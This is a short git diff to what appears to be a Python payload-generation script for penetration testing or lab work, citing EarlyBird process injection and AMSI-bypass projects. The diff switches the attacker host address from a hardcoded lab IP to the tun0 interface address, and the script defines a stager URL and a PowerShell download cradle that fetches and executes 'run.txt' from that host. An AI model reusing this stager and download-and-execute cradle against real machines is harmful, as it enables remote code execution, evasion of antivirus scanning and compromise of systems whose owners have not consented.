@@ -1,6 +1,7 @@
 import base64
 import os
 import subprocess
+import netifaces as ni
 from libpinvoke import PINVOKE
 
 # References:
@@ -8,7 +9,9 @@ from libpinvoke import PINVOKE
 # https://github.com/Kara-4search/EarlyBirdInjection_CSharp
 # https://github.com/0xB455/AmsiBypass/blob/master/Class1.cs
 
-LHOST="10.10.14.110"
+# Hardcode LHOST if needed
+# LHOST="10.10.14.110"
+LHOST = ni.ifaddresses('tun0')[ni.AF_INET][0]['addr']
 LPORT = "443"
 STAGER_URL = f"http://{LHOST}/sc"
 PS_RUNTXT_CMD = f"IEX(New-Object Net.WebClient).downloadString('http://{LHOST}/run.txt')"
